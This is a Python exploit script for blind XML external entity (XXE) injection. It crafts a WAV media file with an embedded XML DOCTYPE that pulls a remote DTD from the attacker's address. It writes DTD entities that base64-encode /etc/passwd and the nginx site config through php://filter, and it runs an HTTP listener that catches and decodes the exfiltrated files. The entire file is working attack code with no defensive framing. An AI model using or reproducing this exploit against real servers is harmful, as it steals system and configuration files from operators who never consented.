#!/usr/bin/python
import base64
import sys
from urllib.parse import urlparse, parse_qs
from http import server
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, List

remote_files_to_fetch = [
    "/etc/passwd",
    "/etc/nginx/sites-enabled/default",
]

EXTRACTION_DTD = "index.dtd"
SEPARATOR = "---"

class ExampleHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def do_GET(self):
        self.do_HEAD()

        if self.path == f"/{EXTRACTION_DTD}":
            with open(EXTRACTION_DTD, "rb") as file: 
                file_content = file.read()
                self.wfile.write(file_content)
                print("dtd payload has been succesfully loaded onto the target server.")
                print(file_content)
        elif self.path.startswith("/?"):
            processed_path = self.path.replace(SEPARATOR, "&")
            parsed_request_url = urlparse(processed_path)
            extracted_files = parse_qs(parsed_request_url.query)
            print(extracted_files)
            extracted_files = sanitize_extracted_files(extracted_files)
            write_extracted_files(extracted_files)
        else:
            print(self.path)
            
def sanitize_extracted_files(extracted_files: List[Dict]) -> List[Dict]:
    for extracted_file in extracted_files:
        extracted_files[extracted_file] = extracted_files[extracted_file][0].replace(" ", "+")
    return extracted_files

def write_extracted_files(extracted_files: List[Dict]):
    for extracted_file in extracted_files:
        with open(extracted_file, "w") as new_file:
            print(extracted_file)
            print(extracted_files[extracted_file])
            print(base64.b64decode(extracted_files[extracted_file]))
            new_file.write(base64.b64decode(extracted_files[extracted_file]).decode("utf-8"))
        
        

if len(sys.argv) == 4:
    ip_address = sys.argv[1]
    port = sys.argv[2]
    output_file = sys.argv[3]

    
    media_payload = f"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{ip_address}:{port}/{EXTRACTION_DTD}'>%remote;%init;%trick;]>\x00"    
    with open(output_file, "w", encoding="latin-1") as media_payload_file:
        media_payload_file.write(media_payload)

    payload1 = ""
    payload2 = f"""
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{ip_address}:{port}/?"""

    for remote_file in remote_files_to_fetch:
        normalized_remote_file = remote_file.replace("/", "_")
        payload1 += f"""
        <!ENTITY % {normalized_remote_file} SYSTEM "php://filter/read=convert.base64-encode/resource={remote_file}">"""
        payload2 += f"""{normalized_remote_file}=%{normalized_remote_file};{SEPARATOR}"""

    payload2 += """'>" >"""
        
    print(payload1, payload2)
    with open(EXTRACTION_DTD, "w") as dtd_file:
        dtd_file.write(payload1+payload2)

    server = HTTPServer(("", int(port)), ExampleHandler)
    print ("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()

else:
    print(f"Usage: ./{sys.argv[0]} ip_address port output_file")
